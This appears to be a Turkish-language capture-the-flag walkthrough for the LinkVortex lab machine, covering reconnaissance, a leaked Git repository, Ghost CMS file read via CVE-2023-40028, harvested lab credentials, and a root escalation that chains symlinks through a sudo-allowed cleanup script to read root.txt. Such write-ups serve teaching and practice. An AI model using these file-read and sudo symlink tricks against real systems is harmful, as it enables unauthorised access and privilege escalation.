---
{"dg-publish":true,"permalink":"/ctf/link-vortex-ctf/"}
---


### Nmap 

![Pasted image 20250119015520.png](/img/user/resimler/Pasted%20image%2020250119015520.png)

![Pasted image 20250119015623.png](/img/user/resimler/Pasted%20image%2020250119015623.png)

80 portunda yönlendirme var . Bu gibi durumlarda /etc/hosts dosyasına hedef url yazıp tekrardan tarayabiliriz.

![Pasted image 20250119015835.png](/img/user/resimler/Pasted%20image%2020250119015835.png)

Gördüğümüz gibi daha fazla bilgi verdi 80 portu . 

---

- **SSH Hizmeti (Port 22)**:
    
    - SSH hizmeti açık ve çalışıyor.
    - **Versiyon**: OpenSSH 8.9p1, Ubuntu 3ubuntu0.10 üzerinde çalışıyor.
    - Bu versiyona yönelik bilinen güvenlik açıkları araştırılabilir.
    - SSH anahtar türleri: **ECDSA** ve **ED25519** kullanılıyor.
- **HTTP Hizmeti (Port 80)**:
    
    - Web sunucusu açık ve çalışıyor.
    - **Sunucu yazılımı**: Apache HTTPD.
    - **HTTP başlıkları**:
        - "Ghost 5.58" jeneratör bilgisi içeriyor. Bu, bir CMS (Content Management System) olabilir; bilinen zafiyetleri kontrol edilebilir.
    - **robots.txt dosyası**:
        - `/ghost/`, `/p/`, `/email/`, `/r/` yolları engellenmiş. Bunları manuel olarak incelemek faydalı olabilir.
    - **Başlık (Title)**: "BitByBit Hardware" — bir donanım sitesi olduğu anlaşılıyor.
- **Genel Sonuçlar**:
    
    - Hedef makine **Linux** işletim sistemi kullanıyor.
    - Versiyon bilgileri ve engelli dizinler üzerinden daha fazla bilgi toplanabilir.
    - Apache ve Ghost CMS'e yönelik bilinen güvenlik açıkları araştırılmalı.

---


## Subdomain Fuzz

Aslında yaptığımız vhost taramasıdır . Subdoain olarak ele alıyoruz sadece. 

![Pasted image 20250119020206.png](/img/user/resimler/Pasted%20image%2020250119020206.png)

Var olduğu tespit edildi: dev.linkvortex.htb, /etc/hosts dosyasına eklendi


## Dirsearch

![Pasted image 20250119020542.png](/img/user/resimler/Pasted%20image%2020250119020542.png)

### /robots.txt

![Pasted image 20250119020655.png](/img/user/resimler/Pasted%20image%2020250119020655.png)

ghost rotasına gidin ve giriş sayfası mevcut

![Pasted image 20250119020803.png](/img/user/resimler/Pasted%20image%2020250119020803.png)


dev.linkvortex.htb dizin taraması gerçekleştirin

![Pasted image 20250119020932.png](/img/user/resimler/Pasted%20image%2020250119020932.png)


## GitHack

Bir Git sızıntısı var, onu indirmek için GitHack aracını kullanın

![Pasted image 20250119021724.png](/img/user/resimler/Pasted%20image%2020250119021724.png)

![Pasted image 20250119021902.png](/img/user/resimler/Pasted%20image%2020250119021902.png)

İçeride bazı "password" anahtar kelimelerinin bulunduğunu fark edebilirsiniz.

İlk şifreyi kullanarak giriş yapabilirsiniz.

![Pasted image 20250119022728.png](/img/user/resimler/Pasted%20image%2020250119022728.png)

```
username: admin@linkvortex.htb
password: OctopiFociPilfer45
```

Backend'e başarılı erişim

![Pasted image 20250119022739.png](/img/user/resimler/Pasted%20image%2020250119022739.png)

Wappalyzer eklentisi GhostCMS'in mevcut sürümünün 5.58 olduğunu gösteriyor veya nmap çıktısında zaten görmüştük . 

![Pasted image 20250119023703.png](/img/user/resimler/Pasted%20image%2020250119023703.png)

## User

### CVE-2023-40028

Google'dan kontrol ettiğimde şunu buldum (2. adres)

![Pasted image 20250119023758.png](/img/user/resimler/Pasted%20image%2020250119023758.png)

Gerekli değişiklikler

![Pasted image 20250119024210.png](/img/user/resimler/Pasted%20image%2020250119024210.png)


![Pasted image 20250119024156.png](/img/user/resimler/Pasted%20image%2020250119024156.png)

Başarıyla /etc/passwd okundu

GitHack'te bulunan bir Docker dosyası da vardı

![Pasted image 20250119024402.png](/img/user/resimler/Pasted%20image%2020250119024402.png)

Bu /var/lib/ghost/config.production.json yapılandırma dosyasını okumayı deneyin

```
file> /var/lib/ghost/config.production.json  
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}

```

Kullanıcı adı ve şifre alın

```
username:bob@linkvortex.htb
password:fibber-talented-worth
```

user.txt dosyasını almak için ssh girişi yapın

![Pasted image 20250119024756.png](/img/user/resimler/Pasted%20image%2020250119024756.png)


### Root

Bob'un Komut Ayrıcalıklarını Kontrol Etme

![Pasted image 20250119024853.png](/img/user/resimler/Pasted%20image%2020250119024853.png)

Bu /opt/ghost/clean_symlink.sh dosyasına göz atın

```
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh 
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi

```

Eğer dosya adı uzantısı `.png` ise ve dosya bir **symlink** içeriyorsa, ayrıca hedef yol **`etc`** veya **`root`** içermiyorsa (yani hedef hassas bir dosya değilse), script şu işlemleri yapar:

1. **Symlink**'i **`/var/quarantined`** dizinine taşır.
2. Eğer `CHECK_CONTENT=true` olarak ayarlanmışsa, script dosyanın içeriğini okumaya çalışır.
3. Ardından, **`root.txt`** dosyasına bağlanan bir **symlink** oluşturur.

Script parametreleri kontrol ettiği için, bu işlemi **double symlink** yöntemiyle atlatabilirsiniz. Aynı zamanda `CHECK_CONTENT` değişkenini **`true`** olarak ayarlayarak hedefe ulaşabilirsiniz.

---
**Symlink (Symbolic Link)**, bir dosya veya dizine işaret eden bir kısayoldur. Bir nevi "pointer" gibi davranır ve asıl dosyanın veya dizinin yerini gösterir.

---

![Pasted image 20250119025306.png](/img/user/resimler/Pasted%20image%2020250119025306.png)

- **Birinci komut (`ln -s /root/root.txt hyh.txt`)**:  
    `/root/root.txt` dosyasına bir **symlink** (sembolik bağlantı) oluşturuluyor. Bu bağlantı `hyh.txt` adıyla `/home/bob` dizininde bulunuyor.
    
- **İkinci komut (`ln -s /home/bob/hyh.txt hyh.png`)**:  
    İlk oluşturulan `hyh.txt` adlı **symlink**'i, `/home/bob/hyh.txt` yolundan, `hyh.png` adıyla başka bir **symlink** olarak oluşturuyor. Yani `hyh.png` aslında `hyh.txt`'yi gösteriyor ve dolaylı olarak `/root/root.txt`'yi işaret ediyor.
    
- **Üçüncü komut (`sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hyh.png`)**:  
    Bu komut, `/home/bob/hyh.png` dosyasını kontrol etmek için çalıştırılıyor. Script, bu **symlink**'i bulup, **quarantine** (karantinaya alma) dizinine taşıyor. Ardından, `CHECK_CONTENT=true` parametresi sayesinde dosyanın içeriğini okuyor ve şifreli bir içerik (`66d405c5d45d81b7d3c53eb85f066fa6`) yazdırıyor.